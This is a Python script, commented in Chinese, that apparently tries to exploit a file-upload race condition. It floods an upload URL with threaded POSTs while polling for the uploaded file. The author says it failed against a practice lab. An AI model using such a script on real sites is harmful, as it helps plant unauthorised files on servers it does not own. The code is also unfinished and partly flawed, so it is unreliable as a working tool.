#写是写出来了，但是我拿靶场测试时没成功，不知道哪里出了问题，不知道是不是请求速度还不够的原因，等更改吧
import requests        #仅文件上传，输入url和本地文件路径
import threading      #文件上传和请求同时，分别输入两个url
from queue import Queue

all = threading.local()               #为多线程设置共享变量
s = threading.local()
data_que = Queue(maxsize=0)           #设置队列，多个线程都从该队列中取数据（这里主要是为了测试100个请求多久）
judgement = Queue(maxsize=1)      #队列控制

def set_session():                    #设置同一session，使多个线程都使用了该session
    if not hasattr(all,'session'):
        all.session = requests.Session()
    return all.session

def set_session2():
    if not hasattr(s,'session'):
        s.session = requests.Session()
    return s.session

def upload():
    session = set_session()           #获取session
    while True:
        url = data_que.get()            #从队列中取出一个数据
        with session.post(url=url, files=files) as response:              #请求
            if response.status_code == 200:
                print("Upload successed...")
            else :
                print("Upload falied...")
        data_que.task_done()          #告诉队列管理器处理完成，以便进行下一步
        if data_que.empty() == True or judgement.full() == True:
            break

def request1():
    session = set_session2()
    while True:
        with session.get(url=req_url) as res:
            print("requesting...")
            if res.status_code == 200:
                judgement.put(1)
                print("File exits...")
                break
            if data_que.empty() == True:                 #empty判断是否为空，这个看要不要留
                print("Failed...")
                break
            else:
                continue

#这里改成函数调用？
url = input("Input the url for upload file:")
file_path = input("Input the file path:")
files = {'file':open(file_path, 'rb')}
times = int(input("Requesting times:"))
req_url = input("Input the url where the upload file exits:")

threads = []

for i in range(15):
    thread1 = threading.Thread(target=upload)
    thread1.daemon = True
    threads.append(thread1)

for i in range(15):
    thread2 = threading.Thread(target=request1)
    thread2.daemon = True
    threads.append(thread2)

for i in range(times):
    data_que.put(url)                 #往队列中塞入url
for thre in threads:
    thre.start()
for thre in threads:
    thre.join()

data_que.join()                  #等待队列中数据获取结束
print("End...")
